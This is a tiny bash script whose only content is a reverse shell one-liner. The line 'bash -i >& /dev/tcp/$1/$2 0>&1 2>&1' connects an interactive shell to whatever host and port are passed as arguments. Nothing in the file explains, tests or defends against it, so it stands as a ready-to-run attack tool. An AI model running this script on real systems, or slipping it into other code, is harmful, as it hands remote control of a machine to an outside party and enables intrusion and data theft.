#!/bin/bash

bash -i >& /dev/tcp/$1/$2 0>&1 2>&1
